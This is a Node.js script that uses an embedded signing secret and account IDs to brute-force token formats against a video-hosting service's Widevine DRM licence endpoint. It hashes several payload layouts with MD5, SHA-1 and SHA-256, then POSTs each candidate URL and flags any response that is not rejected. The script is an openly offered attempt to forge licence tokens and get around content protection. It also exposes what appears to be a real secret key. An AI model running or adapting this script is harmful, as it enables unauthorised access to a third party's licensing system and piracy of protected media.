const crypto = require('crypto');
const https = require('https');

const orgId = "64c6cbb6554ec6e3e9ec51a7";
const assetId = "64d28c927e5821954062dab2";
const signSecret = "2c3d7d427565aa2a60f451355ec8451e";
const expires = Math.round(Date.now() / 1000) + 3600;

function getUrls() {
  const payloads = [
    `${signSecret}/licence/${orgId}/${assetId}?expires=${expires}`,
    `${signSecret}/${orgId}/${assetId}?expires=${expires}`,
    `${signSecret}/${assetId}?expires=${expires}`,
    `${signSecret}/licence/${orgId}?expires=${expires}`,
    `${signSecret}/${orgId}?expires=${expires}`
  ];
  
  let urls = [];
  
  for (let payload of payloads) {
    const md5hash = crypto.createHash('md5').update(payload).digest('hex');
    const sha1hash = crypto.createHash('sha1').update(payload).digest('hex');
    const sha256hash = crypto.createHash('sha256').update(payload).digest('hex');
    
    // For path with assetId
    urls.push(`https://widevine.gumlet.com/licence/${orgId}/${assetId}?token=${md5hash}&expires=${expires}`);
    urls.push(`https://widevine.gumlet.com/licence/${orgId}/${assetId}?token=${sha1hash}&expires=${expires}`);
    urls.push(`https://widevine.gumlet.com/licence/${orgId}/${assetId}?token=${sha256hash}&expires=${expires}`);
    
    // For path without assetId
    urls.push(`https://widevine.gumlet.com/licence/${orgId}?token=${md5hash}&expires=${expires}`);
    urls.push(`https://widevine.gumlet.com/licence/${orgId}?token=${sha1hash}&expires=${expires}`);
    urls.push(`https://widevine.gumlet.com/licence/${orgId}?token=${sha256hash}&expires=${expires}`);
  }
  return urls;
}

const allUrls = getUrls();
console.log(`Total permutations to test: ${allUrls.length}`);

function testUrl(url, index) {
  return new Promise((resolve) => {
    const req = https.request(url, { method: 'POST' }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        if (res.statusCode !== 400 && res.statusCode !== 401) {
           console.log(`!!! SUCCESS !!! Response ${index+1}: ${res.statusCode} - ${data} for URL: ${url}`);
        }
        resolve();
      });
    });
    req.on('error', (e) => {
      resolve();
    });
    req.write('dummy_challenge');
    req.end();
  });
}

async function test() {
  for (let i = 0; i < allUrls.length; i++) {
    await testUrl(allUrls[i], i);
  }
  console.log("Done testing all permutations!");
}

test();
